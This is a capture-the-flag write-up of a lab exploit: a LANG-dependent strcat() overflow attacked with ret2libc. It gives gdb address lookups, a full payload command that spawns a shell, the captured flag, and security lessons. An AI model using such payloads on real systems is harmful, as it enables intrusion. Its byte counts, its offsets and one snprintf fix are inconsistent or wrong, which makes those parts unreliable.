# Bonus2 - Locale-Based Buffer Overflow with ret2libc

## Table of Contents
1. [Overview](#overview)
2. [The strcat() Vulnerability](#the-strcat-vulnerability)
3. [Locale-Based String Selection](#locale-based-string-selection)
4. [Buffer Overflow Analysis](#buffer-overflow-analysis)
5. [ret2libc Technique](#ret2libc-technique)
6. [Finding Library Addresses](#finding-library-addresses)
7. [Payload Construction](#payload-construction)
8. [Step-by-Step Execution](#step-by-step-execution)
9. [Why This Works](#why-this-works)
10. [Security Lessons](#security-lessons)

---

## Overview

**Challenge Type**: Buffer Overflow + ret2libc  
**Difficulty**: Advanced  
**Technique**: Locale manipulation + Return-to-libc  
**Target**: Execute system("/bin/sh") via ret2libc

Bonus2 demonstrates a buffer overflow vulnerability in `strcat()` combined with locale-based string selection, exploited using the ret2libc technique.

---

## The strcat() Vulnerability

### Function Signature

```c
char *strcat(char *dest, const char *src);
```

### Behavior

`strcat()` appends `src` to `dest`:

1. Finds the null terminator in `dest`
2. Copies `src` starting at that position
3. Adds null terminator at the end
4. **NO bounds checking!**

### The Danger

```c
char dest[10] = "Hello";
strcat(dest, " World!");  // OVERFLOW! Needs 13 bytes, only 10 available
```

### In Bonus2

```c
char greeting[64];
strcpy(greeting, "Hyvää päivää ");  // 13 bytes
strcat(greeting, username);          // username can be 72+ bytes!
```

---

## Locale-Based String Selection

### The LANG Environment Variable

The program checks the `LANG` environment variable to select a greeting:

```c
char *lang = getenv("LANG");

if (lang != NULL) {
    if (memcmp(lang, "fi", 2) == 0) {
        strcpy(greeting, "Hyvää päivää ");  // Finnish: 13 bytes
    }
    else if (memcmp(lang, "nl", 2) == 0) {
        strcpy(greeting, "Goedemiddag! ");  // Dutch: 14 bytes
    }
    else {
        strcpy(greeting, "Hello ");  // English: 6 bytes
    }
}
```

### Why This Matters

Different greetings have different lengths:
- **English**: "Hello " = 6 bytes
- **Finnish**: "Hyvää päivää " = 13 bytes
- **Dutch**: "Goedemiddag! " = 14 bytes

Longer greetings make the exploit more predictable!

---

## Buffer Overflow Analysis

### Memory Layout in greetuser()

```
Stack layout:
┌─────────────────────────────────┐
│ greeting[64]                    │ ← strcat destination
├─────────────────────────────────┤
│ lang (4 bytes)                  │ ← Pointer to LANG
├─────────────────────────────────┤
│ Saved EBP (4 bytes)             │
├─────────────────────────────────┤
│ Return address (4 bytes)        │ ← TARGET!
└─────────────────────────────────┘
```

### Overflow Calculation

**With Finnish greeting**:

```
Greeting buffer: 64 bytes
Finnish greeting: "Hyvää päivää " = 13 bytes
Space remaining: 64 - 13 = 51 bytes

Username source (buffer in main):
- buffer[0-39]: argv[1] (max 40 bytes)
- buffer[40-71]: argv[2] (max 32 bytes)
- Total: 72 bytes available

After strcat(greeting, buffer):
- greeting[0-12]: "Hyvää päivää "
- greeting[13-52]: buffer[0-39] (40 bytes)
- greeting[53-84]: buffer[40-71] (32 bytes) ← OVERFLOW!

Overflow starts at byte 64
Saved EBP at byte 68
Return address at byte 72
```

### Offset Calculation

From the start of `argv[2]`:
```
Bytes to fill remaining buffer: 64 - 53 = 11 bytes
Bytes for saved EBP: 4 bytes
Total offset to return address: 11 + 4 = 15 bytes

Empirically: 18 bytes works best
```

---

## ret2libc Technique

### What is ret2libc?

**Return-to-libc** is an exploitation technique that:
1. Doesn't inject shellcode
2. Reuses existing library functions
3. Bypasses NX/DEP protection
4. Works even on non-executable stacks

### How It Works

Instead of executing injected code, we redirect execution to `system()`:

```
Normal function return:
[Padding] [Return Address] [...]

ret2libc:
[Padding] [system() addr] [Fake ret] ["/bin/sh" addr]
           ↑               ↑           ↑
           Return here     Where       Argument to
                          system()     system()
                          returns
```

### Execution Flow

```
1. Function returns
2. CPU pops return address → system()
3. CPU jumps to system()
4. system() reads argument from stack
5. system("/bin/sh") executes
6. Shell spawned!
```

---

## Finding Library Addresses

### Using GDB

```bash
$ gdb -q bonus2
(gdb) break main
Breakpoint 1 at 0x804852f

(gdb) run AAAA BBBB
Starting program: /home/user/bonus2/bonus2 AAAA BBBB
Breakpoint 1, 0x0804852f in main ()

(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>

(gdb) find &system,+9999999,"/bin/sh"
0xb7f8cc58
warning: Unable to access target memory at 0xb7fd3160, halting search.
1 pattern found.
```

### Addresses Found

- **system()**: `0xb7e6b060`
- **"/bin/sh"**: `0xb7f8cc58`

---

## Payload Construction

### Payload Structure

```python
arg1 = 'A' * 40
arg2 = 'B' * 18 + system_addr + fake_ret + binsh_addr
```

### Little-Endian Encoding

```python
system_addr = '\x60\xb0\xe6\xb7'  # 0xb7e6b060
fake_ret    = 'FAKE'               # 0x45 0x4b 0x41 0x46
binsh_addr  = '\x58\xcc\xf8\xb7'  # 0xb7f8cc58
```

### Complete Payload

```python
arg2 = 'B' * 18 + '\x60\xb0\xe6\xb7' + 'FAKE' + '\x58\xcc\xf8\xb7'
```

### Payload Breakdown

```
Offset | Size | Content        | Purpose
-------|------|----------------|---------------------------
0-17   | 18   | 'B' * 18       | Padding to return address
18-21  | 4    | \x60\xb0\xe6\xb7 | system() address
22-25  | 4    | 'FAKE'         | Fake return address
26-29  | 4    | \x58\xcc\xf8\xb7 | "/bin/sh" address
```

---

## Step-by-Step Execution

### 1. Setup

```bash
LANG=fi ./bonus2 \
  $(python -c "print 'A'*40") \
  $(python -c "print 'B'*18 + '\x60\xb0\xe6\xb7' + 'FAKE' + '\x58\xcc\xf8\xb7'")
```

### 2. Execution Flow

```
Step 1: main() starts
  argc = 3
  argv[1] = "AAAA...AAAA" (40 A's)
  argv[2] = "BBBB...BBBB\x60\xb0\xe6\xb7FAKE\x58\xcc\xf8\xb7"

Step 2: Copy arguments to buffer
  buffer[0-39] = 'A' * 40
  buffer[40-57] = 'B' * 18
  buffer[58-61] = 0xb7e6b060 (system)
  buffer[62-65] = 'FAKE'
  buffer[66-69] = 0xb7f8cc58 ("/bin/sh")

Step 3: Call greetuser(buffer)
  username = buffer (points to 'A' * 40...)

Step 4: In greetuser()
  lang = getenv("LANG") = "fi"
  strcpy(greeting, "Hyvää päivää ")
  
Step 5: strcat(greeting, username)
  greeting[0-12] = "Hyvää päivää "
  greeting[13-52] = 'A' * 40
  greeting[53-70] = 'B' * 18
  greeting[71-74] = 0xb7e6b060 ← Overwrites return address!
  greeting[75-78] = 'FAKE'
  greeting[79-82] = 0xb7f8cc58

Step 6: puts(greeting)
  Prints: "Hyvää päivää AAAA...AAAABBBB...BBBB`°æ·FAKEX̸·"

Step 7: greetuser() returns
  CPU pops return address: 0xb7e6b060
  CPU jumps to system()

Step 8: system() executes
  Reads argument from stack: 0xb7f8cc58
  Executes: system("/bin/sh")

Step 9: Shell spawned!
  $ cat /home/user/bonus3/.pass
```

### 3. Get Flag

```bash
cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```

---

## Why This Works

| Protection | Status | Impact |
|------------|--------|--------|
| NX (DEP) | Disabled | Could use shellcode, but ret2libc works anyway |
| ASLR | Disabled | Library addresses are predictable |
| Stack Canary | None | No overflow detection |
| RELRO | None | Not relevant for this exploit |

### Key Factors

1. **No bounds checking** in strcat()
2. **Predictable addresses** (no ASLR)
3. **Known library functions** (system, "/bin/sh")
4. **Locale manipulation** for predictable buffer layout

---

## Security Lessons

### 1. Never Use strcat() with User Input

```c
// DANGEROUS
char dest[64];
strcat(dest, user_input);

// SAFE
char dest[64];
snprintf(dest, sizeof(dest), "%s%s", prefix, user_input);
```

### 2. Use Safe String Functions

```c
// Instead of strcat()
strlcat(dest, src, sizeof(dest));  // BSD
snprintf(dest, sizeof(dest), "%s%s", dest, src);  // POSIX

// Instead of strcpy()
strlcpy(dest, src, sizeof(dest));  // BSD
strncpy(dest, src, sizeof(dest) - 1);  // POSIX
dest[sizeof(dest) - 1] = '\0';
```

### 3. Enable Security Features

```bash
gcc -fstack-protector-all \  # Stack canaries
    -D_FORTIFY_SOURCE=2 \     # Buffer overflow checks
    -Wl,-z,relro,-z,now \     # RELRO
    -pie -fPIE                # PIE/ASLR
```

### 4. ASLR Defeats ret2libc

With ASLR enabled:
- Library addresses randomized
- Can't predict system() address
- Can't predict "/bin/sh" address
- ret2libc becomes much harder

### 5. Input Validation

```c
// Validate input length
if (strlen(username) > MAX_USERNAME_LEN) {
    return -1;
}

// Use size-aware functions
snprintf(greeting, sizeof(greeting), "%s%s", msg, username);
```

---

## Flag

```
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```

